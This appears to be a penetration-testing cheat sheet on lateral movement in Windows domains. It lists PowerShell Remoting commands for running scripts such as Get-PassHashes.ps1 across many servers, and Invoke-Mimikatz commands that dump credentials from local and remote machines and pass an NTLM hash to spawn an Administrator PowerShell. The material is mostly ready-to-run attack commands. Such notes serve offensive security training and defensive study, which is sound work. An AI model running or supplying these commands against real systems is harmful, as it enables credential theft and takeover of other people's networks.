# Lateral Movement - Powershell Remoting

## PSSession

- Interactive
- Runs in a new process (wsmprovhost)
- Is stateful (session is tracked)

## Useful cmdlets

```
New-PSSession -ComputerName computername.domainanme
Enter-PSSession -ComputerName computername.domainanme
```

We can use `-Credential` to pass username/password

### To execute commands or scriptblocks

```
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)

Invoke-Command -Scriptblock {whoami;hostname} -ComputerName computername.domainname


```

### To execute scripts from files

```
Invoke-Command -FilePath C:\path\to\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_server>)
```

### Execute `Stateful` commands 

```
$Sess = New-PSSession -ComputerName computername

Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}

```

## Mimikatz Powershell
Powershell script for mimikatz is used for dumping credentials ,tickets without dropping mimikatz exe  to disk . It is used for passing , replaying hashes. Hashes can only be dumped with administrative privilieges 

### Dump credentials on local machine

```
Invoke-Mimikatz -DumpCreds
```

### Dump credentials on multiple remote machines 

```
Invoke-Mimikatz -DumpCreds -ComputerName @("computer1","computer2")
```

### Generate tokens from hashes

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:computername.domain.name /ntlm:ntlmhash /run:powershell.exe"'
```

